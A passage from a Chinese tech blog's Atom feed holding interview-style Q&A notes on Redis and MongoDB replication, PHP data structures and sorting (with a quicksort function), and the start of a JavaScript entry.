&lt;pre&gt;&lt;code&gt;slaveof 192.168.77.211 12002 # slaveof master的ip master的端口
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;如何用redis实现访问频率控制如每ip每分钟请求不能超过20次&quot;&gt;如何用Redis实现访问频率控制，如每IP每分钟请求不能超过20次？&lt;/h2&gt;

&lt;p&gt;&lt;code&gt;sorted set&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;频率控制在需求上分为两种:&lt;/p&gt;

&lt;p&gt;1、以自然时间单位控制，如自然天，自然月…,日历或钟表上的单位&lt;/p&gt;

&lt;p&gt;2、以持续时间控制，比如从第一次操作后的1个小时或一天（24小时）；&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;mongodb相关&quot;&gt;MongoDb相关&lt;/h1&gt;

&lt;h2 id=&quot;什么是mongodb&quot;&gt;什么是MongoDB？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;MongoDB是一种文件导向数据库管理系统，由C++撰写而成，以此来解决应用程序开发社区中的大量现实问题。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;为什么要使用mongodb&quot;&gt;为什么要使用MongoDB？&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;弱一致性（最终一致），更能保证用户的访问速度&lt;/li&gt;
  &lt;li&gt;文档结构的存储方式，能够更便捷的获取数据。&lt;/li&gt;
  &lt;li&gt;内置GridFS，支持大容量的存储。&lt;/li&gt;
  &lt;li&gt;内置Sharding。&lt;/li&gt;
  &lt;li&gt;第三方支持丰富。(这是与其他的NoSQL相比，MongoDB也具有的优势)&lt;/li&gt;
  &lt;li&gt;性能优越&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;mongodb的启动参数有哪些&quot;&gt;MongoDB的启动参数有哪些？&lt;/h2&gt;

&lt;h2 id=&quot;如何配置mongodb的主从复制&quot;&gt;如何配置MongoDB的主从复制？&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;slave=true
source=192.168.2.2:27017
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;如何配置mongodb副本集&quot;&gt;如何配置MongodB副本集？&lt;/h2&gt;

&lt;p&gt;mongoDB的副本也是这个，主从模式其实就是一个单副本的应用，没有很好的扩展性和容错性。而副本集具有多个副本保证了容错性，就算一个副本挂掉了还有很多副本存在，并且解决了上面第一个问题“主节点挂掉了，整个集群内会自动切换”&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;参考&quot;&gt;参考&lt;/h1&gt;
&lt;p&gt;&lt;a href=&quot;http://www.infoq.com/cn/news/2011/01/nosql-why&quot;&gt;NoSQL开篇——为什么要使用NoSQL&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://dbanotes.net/arch/five-minute_rule.html&quot;&gt;关于 I/O 的五分钟法则(Five-Minute Rule)&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://www.akkadia.org/drepper/cpumemory.pdf&quot;&gt;What every programmer should know about memory&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://www.cnblogs.com/jiunadianshi/articles/2429125.html&quot;&gt;Memcache内存临界测试&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://blog.csdn.net/yunhua_lee/article/details/7599671&quot;&gt;缓存淘汰算法系列之1——LRU类&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://blog.nosqlfan.com/html/3139.html&quot;&gt;Redis系统性介绍&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://simplapi.wordpress.com/2012/04/13/php-and-node-js-session-share-redi/&quot;&gt;PHP and Node.JS session share using Redis&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://cfwlxf.blog.51cto.com/3966339/1433637&quot;&gt;构建高性能数据库缓存之redis主从复制&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://coolshell.cn/articles/5826.html&quot;&gt;千万别用MongoDB？真的吗？！&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;搭建高可用mongodb集群（二）—— 副本集&quot;&gt;搭建高可用mongodb集群（二）—— 副本集&lt;/a&gt;&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>PHP数据结构</title>
   <link href="http://yanpeipan.github.io/2015/01/06/php%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84.html"/>
   <updated>2015-01-06T00:00:00+08:00</updated>
   <id>http://yanpeipan.github.io/2015/01/06/php数据结构</id>
   <content type="html">
&lt;hr /&gt;

&lt;h1 id=&quot;数据逻辑结构&quot;&gt;数据逻辑结构&lt;/h1&gt;

&lt;h2 id=&quot;数据逻辑结构-1&quot;&gt;数据逻辑结构&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;数据的逻辑结构是对数据之间关系的描述，有时就把逻辑结构简称为数据结构。逻辑结构形式地定义为（K，R）（或（D，S）），其中，K是 数据元素的有限集，R是K上的关系的有限集。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;逻辑结构有四种基本类型：集合结构、 线性结构、树状结构和网络结构。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;数据结构概念&quot;&gt;数据结构概念&lt;/h1&gt;

&lt;h2 id=&quot;数据结构到底是什么&quot;&gt;数据结构到底是什么？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;数据结构（英语：data structure）是计算机中存储、组织数据的方式。通常情况下，精心选择的数据结构可以带来最优效率的算法。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;数据元素与数据项是什么&quot;&gt;数据元素与数据项是什么？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;数据元素是数据的基本单位，在计算机程序中通常作为一个整体考虑。一个数据元素由若干个数据项组成。数据项是数据的不可分割的最小单位。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;数据结构包括哪些东西&quot;&gt;数据结构包括哪些东西？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;数据结构分别为逻辑结构、存储结构（物理结构）和数据的运算。数据的逻辑结构是从具体问题抽象出来的数学模型，是描述数据元素及其关系的数学特性的，有时就把逻辑结构简称为数据结构。逻辑结构是在计算机存储中的映像，形式地定义为（K，R）（或（D，S）），其中，K是数据元素的有限集，R是K上的关系的有限集。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;散列存储与索引存储有啥不一样的地方&quot;&gt;散列存储与索引存储有啥不一样的地方？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;索引存储方法：除建立存储结点信息外，还建立附加的索引表来标识结点的地址。
散列存储方法：就是根据结点的关键字直接计算出该结点的存储地址。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;运算效率&quot;&gt;运算效率&lt;/h1&gt;

&lt;h2 id=&quot;如何判断算法效率&quot;&gt;如何判断算法效率？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;一个算法的评价主要从时间复杂度和空间复杂度来考虑。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;strong&gt;时间复杂度&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;算法的时间复杂度是指执行算法所需要的计算工作量。一般来说，计算机算法是问题规模n 的函数f(n)，算法的时间复杂度也因此记做。
T(n)=Ο(f(n))
因此，问题的规模n 越大，算法执行的时间的增长率与f(n) 的增长率正相关，称作渐进时间复杂度（Asymptotic Time Complexity）。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;空间复杂度&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;算法的空间复杂度是指算法需要消耗的内存空间。其计算和表示方法与时间复杂度类似，一般都用复杂度的渐近性来表示。同时间复杂度相比，空间复杂度的分析要简单得多。&lt;/p&gt;

&lt;h2 id=&quot;什么是时间复杂度如何计算时间复杂度&quot;&gt;什么是时间复杂度？如何计算时间复杂度？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;算法的时间复杂度是一个函数，它定量描述了该算法的运行时间。这是一个关于代表算法输入值的字符串的长度的函数。时间复杂度常用大O符号表述，不包括这个函数的低阶项和首项系数。使用这种方式时，时间复杂度可被称为是渐近的，它考察当输入值大小趋近无穷时的情况。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;时间复杂度常用大O符号表述，不包括这个函数的低阶项和首项系数。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ol&gt;
  &lt;li&gt;一般情况下，算法的基本操作重复执行的次数是模块n的某一个函数f(n)，因此，算法的时间复杂度记做：T(n)=O(f(n))&lt;/li&gt;
  &lt;li&gt;在计算时间复杂度的时候，先找出算法的基本操作，然后根据相应的各语句确定它的执行次数，再找出 T(n) 的同数量级（它的同数量级有以下：1，log(2)n，n，n log(2)n ，n的平方，n的三次方，2的n次方，n!），找出后，f(n) = 该数量级，若 T(n)/f(n) 求极限可得到一常数c，则时间复杂度T(n) = O(f(n))&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;二分法的时间复杂度是多少暴力破解不重复的6位密码的时间复杂度是多少&quot;&gt;二分法的时间复杂度是多少？暴力破解不重复的6位密码的时间复杂度是多少？&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;logN&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;常见数据结构&quot;&gt;常见数据结构&lt;/h1&gt;

&lt;h2 id=&quot;单链表的逻辑结构是什么样的&quot;&gt;单链表的逻辑结构是什么样的？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;链接方式存储的线性表简称为链表（Linked List）。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;线性表（Linear List）是由n（n≥0）个数据元素（结点）a1，a2，…，an组成的有限序列。&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;数据元素的个数n定义为表的长度（n=0时称为空表）。&lt;/li&gt;
  &lt;li&gt;将非空的线性表（n＞0）记作：（a1，a2，…，an）&lt;/li&gt;
  &lt;li&gt;数据元素ai（1≤i≤n）只是个抽象符号，其具体含义在不同情况下可以不同。&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;单链表如何插入数据如何删除数据&quot;&gt;单链表如何插入数据？如何删除数据？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;单链表是链表的其中一种，关于单链表就是其节点中有数据域和只有一个指向下个节点的指针域。创建单链表的方法有两种，分别是头插法和尾插法。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;所谓头插法，就是按节点的逆序方法逐渐将结点插入到链表的头部。反之尾插法就是按节点的顺序逐渐将节点插入到链表的尾部。相对来说，头插法要比尾插法算法简单，但是最后产生的链表是逆序的，即第一个输入的节点实际是链表的最后一个节点。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;单链表头插法和尾插法的时间复杂度是一样的吗为什么&quot;&gt;单链表头插法和尾插法的时间复杂度是一样的吗？为什么？&lt;/h2&gt;

&lt;h2 id=&quot;如何使用php实现单链表结构&quot;&gt;如何使用PHP实现单链表结构？&lt;/h2&gt;

&lt;p&gt;&lt;code&gt;SplDoublyLinkedList&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;双向链表和单链表有什么不同&quot;&gt;双向链表和单链表有什么不同？&lt;/h2&gt;

&lt;p&gt;双向链表也叫双链表，是链表的一种，它的每个数据结点中都有两个指针，分别指向直接后继和直接前驱。所以，从双向链表中的任意一个结点开始，都可以很方便地访问它的前驱结点和后继结点。一般我们都构造双向循环链表。&lt;/p&gt;

&lt;h2 id=&quot;网站可以用循环链表实现某种摇奖算法吗怎么做&quot;&gt;网站可以用循环链表实现某种摇奖算法吗？怎么做？&lt;/h2&gt;

&lt;p&gt;随机数与链表长度取余&lt;/p&gt;

&lt;h2 id=&quot;队列的逻辑结构是什么样的&quot;&gt;队列的逻辑结构是什么样的？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;队列，又称为伫列（queue），是先进先出（FIFO, First-In-First-Out）的线性表。在具体应用中通常用链表或者数组来实现。队列只允许在后端（称为rear）进行插入操作，在前端（称为front）进行删除操作。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;队列需要排序吗为什么&quot;&gt;队列需要排序吗？为什么？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;优先级队列 是不同于先进先出队列的另一种队列。每次从队列中取出的是具有最高优先权的元素。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;队列一般用在哪些场景下&quot;&gt;队列一般用在哪些场景下？&lt;/h2&gt;

&lt;h2 id=&quot;如果用php实现一个队列&quot;&gt;如果用PHP实现一个队列？&lt;/h2&gt;

&lt;p&gt;&lt;code&gt;SplQueue&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;栈与队列哪里不一样&quot;&gt;栈与队列哪里不一样？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;队列的操作方式和堆栈类似，唯一的区别在于队列只允许新数据在后端进行添加。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;如何用php实现栈结构&quot;&gt;如何用PHP实现栈结构？&lt;/h2&gt;

&lt;p&gt;&lt;code&gt;SplStack&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;树的逻辑结构是什么&quot;&gt;树的逻辑结构是什么？&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;G 是没有回路的连通图。&lt;/li&gt;
  &lt;li&gt;G 没有回路，但是在G内添加任意一条边，就会形成一个回路。&lt;/li&gt;
  &lt;li&gt;G 是连通的，但是如果去掉任意一条边，就不再连通。&lt;/li&gt;
  &lt;li&gt;G 是连通的，并且3顶点的完全图 K_3 不是G的子图。&lt;/li&gt;
  &lt;li&gt;G内的任意两个顶点能被唯一路径所连通。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;什么是二叉树的先序遍历中序遍历和后序遍历&quot;&gt;什么是二叉树的先序遍历，中序遍历和后序遍历？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;对于一般的树，可以用和普通的图一样的方法遍历，比如深度优先搜索和宽度优先搜索。如果和树的每个节点相邻的点有固定的顺序，深度优先搜索可以不储存当前点以外的任何信息，而且不用判重。而在有根树中更方便，所以有根树中很少使用宽度优先搜索。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;对于有根树的从根开始的深度优先搜索遍历，有三种特定的顺序：&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;前序遍历&lt;/strong&gt;
先访问根节点，然后再访问所有的子树；&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;后序遍历&lt;/strong&gt;
先访问子树，然后再访问根节点；&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;中序遍历&lt;/strong&gt;
二叉树专用，先访问左子树，然后是根节点，最后是右子树。&lt;/p&gt;

&lt;h2 id=&quot;已知二叉树的先序遍历中序遍历的结果如何推断后续遍历的结果&quot;&gt;已知二叉树的先序遍历，中序遍历的结果，如何推断后续遍历的结果？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;已知中序遍历和任一其他遍历的情况下，可以还原一个二叉树。一个直观的方法是按前序或者反转的后序插入一个按中序排序的搜索树。已知前序和中序也可以还原一棵树，但是不能知道二叉树中一个节点唯一的子树是在左边还是右边。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;如何用php实现二叉树&quot;&gt;如何用PHP实现二叉树？&lt;/h2&gt;

&lt;p&gt;&lt;code&gt;SplHeap&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;二叉查找树与二分法是什么关系&quot;&gt;二叉查找树与二分法是什么关系？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;二叉查找树（英语：Binary Search Tree），也称二叉搜索树、有序二叉树（英语：ordered binary tree），排序二叉树（英语：sorted binary tree），是指一棵空树或者具有下列性质的二叉树：&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;若任意节点的左子树不空，则左子树上所有结点的值均小于或等于它的根结点的值；&lt;/li&gt;
  &lt;li&gt;任意节点的右子树不空，则右子树上所有结点的值均大于它的根结点的值；&lt;/li&gt;
  &lt;li&gt;任意节点的左、右子树也分别为二叉查找树。&lt;/li&gt;
  &lt;li&gt;没有键值相等的节点（英语：no duplicate nodes）。&lt;/li&gt;
  &lt;li&gt;二叉查找树相比于其他数据结构的优势在于查找、插入的时间复杂度较低。为O(log n)。二叉查找树是基础性数据结构，用于构建更为抽象的数据结构，如集合、multiset、关联数组等。&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;二叉查找树相比于其他数据结构的优势在于查找、插入的时间复杂度较低。为O(log n)。二叉查找树是基础性数据结构，用于构建更为抽象的数据结构，如集合、multiset、关联数组等。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;折半搜索每次把搜索区域减少一半，时间复杂度为O\left( \log n  \right)。（n代表集合中元素的个数）&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;在最坏情况下，二叉排序树是通过把一个有序表的n个结点依次插入而生成的，此时所得的二叉排序树蜕化为棵深度为n的单支树，它的平均查找长度和单链表上的顺序查找相同，亦是(n+1)/2。&lt;/li&gt;
  &lt;li&gt;在最好情况下，二叉排序树在生成的过程中，树的形态比较匀称，最终得到的是一棵形态与二分查找的判定树相似的二叉排序树，此时它的平均查找长度大约是lgn。&lt;/li&gt;
  &lt;li&gt;插入、删除和查找算法的时间复杂度均为O(lgn)。&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;就平均时间性能而言，二叉排序树上的查找和二分查找差不多。就维护表的有序性而言，二叉排序树无须移动结点，只需修改指针即可完成插入和删除操作，且其平均的执行时间均为O(lgn)，因此更有效。二分查找所涉及的有序表是一个向量，若有插入和删除结点的操作，则维护表的有序性所花的代价是O(n)。当有序表是静态查找表时，宜用向量作为其存储结构，而采用二分查找实现其查找操作；若有序表里动态查找表，则应选择二叉排序树作为其存储结构。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;递归和循环&quot;&gt;递归和循环&lt;/h1&gt;

&lt;h2 id=&quot;什么是递归&quot;&gt;什么是递归？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;递归（英语：Recursion），又译为递回，在数学与计算机科学中，是指在函数的定义中使用函数自身的方法。递归一词还较常用于描述以自相似方法重复事物的过程。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;递归和循环能相互转换吗&quot;&gt;递归和循环能相互转换吗？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;“递归的数据总是需要递归的程序来处理。虽然递归有时候表现为另外的形式，比如循环(loop)，但是“递归”这个概念比“循环”更广泛一些。有很多递归程序不能用循环来表达”&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;一般我们使用递归可能出现内存溢出或者无限级递归如何解决&quot;&gt;一般我们使用递归可能出现内存溢出或者无限级递归，如何解决？&lt;/h2&gt;

&lt;p&gt;php.ini&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;;PCRE library recursion limit.
;Please note that if you set this value to a high number you may consume all
;the available process stack and eventually crash PHP (due to reaching the
;stack size limit imposed by the Operating System).
; http://php.net/pcre.recursion-limit
;pcre.recursion_limit=100000
&lt;/code&gt;&lt;/pre&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;查找和排序算法&quot;&gt;查找和排序算法&lt;/h1&gt;

&lt;h2 id=&quot;二分查找算法的思想是什么&quot;&gt;二分查找算法的思想是什么？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;二分查找可以解决（预排序数组的查找）问题：只要数组中包含T（即要查找的值），那么通过不断缩小包含T的范围，最终就可以找到它。一开始，范围覆盖整个数组。将数组的中间项与T进行比较，可以排除一半元素，范围缩小一半。就这样反复比较，反复缩小范围，最终就会在数组中找到T，或者确定原以为T所在的范围实际为空。对于包含N个元素的表，整个查找过程大约要经过log(2)N次比较。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;插值查找与而分发查找是什么关系&quot;&gt;插值查找与而分发查找是什么关系？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;也叫按比例查找。该查找是按照一定比例去修改每次分割的值&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;插值查找通过下列公式&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/image/1-120301115116330.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;插值查找是平均性能最好的查找方法，但只适合于关键码均匀分布的表，其时间效率依然是O(log2n)。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;斐波那契查找的思想是什么&quot;&gt;斐波那契查找的思想是什么？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;斐波那契查找分割的思想为：对于表长为F(i)-1 的有序表，以相对low 偏移量F(i-1)-1 取中点，即mid=low+F(i-1)-1，对表进行分割，则左子表表长为F(i-1)-1，右子表表长为F(i)-1-[F(i-1)-1]-1=F(i-2)-1。可见，两个子表表长也都是某个斐波那契数-1，因而，可以对子表继续分割。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;当n 很大时，该查找方法称为黄金分割法，其平均性能比折半查找好，但其时间效率仍为O(log2n)，而且，在最坏情况下比折半查找差，优点是计算中点仅作加、减运算。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;什么叫排序&quot;&gt;什么叫排序？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;排序是计算机内经常进行的一种操作，其目的是将一组“无序”的记录序列调整为“有序”的记录序列。分内部排序和外部排序。若整个排序过程不需要访问外存便能完成，则称此类排序问题为内部排序。反之，若参加排序的记录数量很大，整个序列的排序过程不可能在内存中完成，则称此类排序问题为外部排序。内部排序的过程是一个逐步扩大记录的有序序列长度的过程。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;什么是稳定的排序算法&quot;&gt;什么是稳定的排序算法？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;稳定排序 假设在待排序的文件中，存在两个或两个以上的记录具有相同的关键字，在
用某种排序法排序后，若这些相同关键字的元素的相对次序仍然不变，则这种排序方法
是稳定的。其中冒泡，插入，基数，归并属于稳定排序，选择，快速，希尔，堆属于不稳定排序。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;就地排序 若排序算法所需的辅助空间并不依赖于问题的规模n，即辅助空间为O（1）,
则称为就地排序。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;快速排序的思想是怎么样的php如何实现&quot;&gt;快速排序的思想是怎么样的？PHP如何实现？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;快速排序（Quicksort）是对冒泡排序的一种改进。由C. A. R. Hoare在1962年提出。它的基本思想是：通过一趟排序将要排序的数据分割成独立的两部分，其中一部分的所有数据都比另外一部分的所有数据都要小，然后再按此方法对这两部分数据分别进行快速排序，整个排序过程可以递归进行，以此达到整个数据变成有序序列。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;快速排序是二叉查找树（二叉查找树）的一个空间优化版本。不是循序地把数据项插入到一个明确的树中，而是由快速排序组织这些数据项到一个由递归调用所隐含的树中。这两个算法完全地产生相同的比较次数，但是顺序不同。对于排序算法的稳定性指标，原地分区版本的快速排序算法是不稳定的。其他变种是可以通过牺牲性能和空间来维护稳定性的。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;快速排序的最直接竞争者是堆排序（Heapsort）。堆排序通常比快速排序稍微慢，但是最坏情况的运行时间总是O(n log n)。快速排序是经常比较快，除了introsort变化版本外，仍然有最坏情况性能的机会。如果事先知道堆排序将会是需要使用的，那么直接地使用堆排序比等待 introsort 再切换到它还要快。堆排序也拥有重要的特点，仅使用固定额外的空间（堆排序是原地排序），而即使是最佳的快速排序变化版本也需要Θ(log n)的空间。然而，堆排序需要有效率的随机存取才能变成可行。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;快速排序也与归并排序（Mergesort）竞争，这是另外一种递归排序算法，但有坏情况O(n log n)运行时间的优势。不像快速排序或堆排序，归并排序是一个稳定排序，且可以轻易地被采用在链表（linked list）和存储在慢速访问媒体上像是磁盘存储或网络连接存储的非常巨大数列。尽管快速排序可以被重新改写使用在炼串行上，但是它通常会因为无法随机存取而导致差的基准选择。归并排序的主要缺点，是在最佳情况下需要Ω(n)额外的空间。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code&gt;function qsort($arr) {
  $len = count($arr);
  $mid = array_pop($arr);
  $left = [];
  $right = [];
  if ($len &amp;lt;= 1) {
    return $arr;
  }

  foreach($arr as $value) {
    if ($value &amp;gt; $mid) {
      $right[] = $value;
    }elseif ($value &amp;lt; $mid) {
      $left[] = $value;
    }
  }
  $left = qsort($left);
  $right = qsort($right);
  return array_merge($left, array($mid), $right);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;如何改进快排算法&quot;&gt;如何改进快排算法？&lt;/h2&gt;

&lt;p&gt;快速排序的三个步骤：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;通过优化基准元素的选取：在待排序列中，按照某种方式挑出一个元素，作为 “基准”（pivot）
    &lt;ul&gt;
      &lt;li&gt;取序列的第一个，最后一个或中间元素作为基准&lt;/li&gt;
      &lt;li&gt;随机选取基准 引入的原因：在待排序列是部分有序时，固定选取枢轴使快排效率底下，要缓解这种情况，就引入了随机选取枢轴&lt;/li&gt;
      &lt;li&gt;三数取中（median-of-three） 引入的原因：虽然随机选取枢轴时，减少出现不好分割的几率，但是还是最坏情况下还是O(n^2），要缓解这种情况，就引入了三数取中选取枢轴&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;分割操作：以该基准在序列中的实际位置，把序列分成两个子序列。此时，在基准左边的元素都比该基准小，在基准右边的元素都比基准大
    &lt;ul&gt;
      &lt;li&gt;在一次分割结束后，可以把与Key相等的元素聚在一起，继续下次分割时，不用再对与key相等元素分割&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;递归地对两个序列进行快速排序，直到序列为空或者只有一个元素。
    &lt;ul&gt;
      &lt;li&gt;如果待排序的序列划分极端不平衡，递归的深度将趋近于n，而栈的大小是很有限的，每次递归调用都会耗费一定的栈空间，函数的参数越多，每次递归耗费的空间也越多。使用尾递归优化后，可以缩减堆栈深度，由原来的O(n)缩减为O(logn)，将会提高性能。&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;用插入排序改进快速排序算法
    &lt;ul&gt;
      &lt;li&gt;根据插入排序在待排对象基本有序下具有较好性能这一特点，改进快速排序，在快速排序的递归调用中，只对长度大于等于某数k时递归，最后再对整个序列用插入排序来完成排序过程。&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;参考&quot;&gt;参考&lt;/h1&gt;
&lt;p&gt;&lt;a href=&quot;http://student.zjzk.cn/course_ware/data_structure/web/chazhao/chazhao9.3.1.5.htm&quot;&gt;数据结构&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://php.net/manual/zh/pcre.configuration.php#ini.pcre.recursion-limit&quot;&gt;ini.pcre.recursion-limit&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://blog.csdn.net/v_july_v/article/details/7093204&quot;&gt;Jon Bentley：90%无法正确实现二分查找&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://zh.wikipedia.org/wiki/%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F&quot;&gt;快速排序&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://blog.csdn.net/insistgogo/article/details/7785038&quot;&gt;三种快速排序以及快速排序的优化&lt;/a&gt;&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>JavaScript精髓</title>
   <link href="http://yanpeipan.github.io/2015/01/03/JavaScript%E7%B2%BE%E9%AB%93.html"/>
   <updated>2015-01-03T00:00:00+08:00</updated>
   <id>http://yanpeipan.github.io/2015/01/03/JavaScript精髓</id>
   <content type="html">
&lt;h1 id=&quot;javascript基础&quot;&gt;JavaScript基础&lt;/h1&gt;

&lt;h2 id=&quot;javascript能做什么&quot;&gt;JavaScript能做什么?&lt;/h2&gt;

&lt;p&gt;现在JavaScript能做的事情已经非常多了：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;图形处理&lt;/li&gt;
  &lt;li&gt;PDF生成&lt;/li&gt;
  &lt;li&gt;建立服务器&lt;/li&gt;
  &lt;li&gt;编译解释器&lt;/li&gt;
  &lt;li&gt;图形界面&lt;/li&gt;
  &lt;li&gt;数据库&lt;/li&gt;
  &lt;li&gt;各种测试工具&lt;/li&gt;
  &lt;li&gt;视频和音频播放和处理&lt;/li&gt;
  &lt;li&gt;通信&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;多人协作&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;做DNA分析：genome.js&lt;/li&gt;
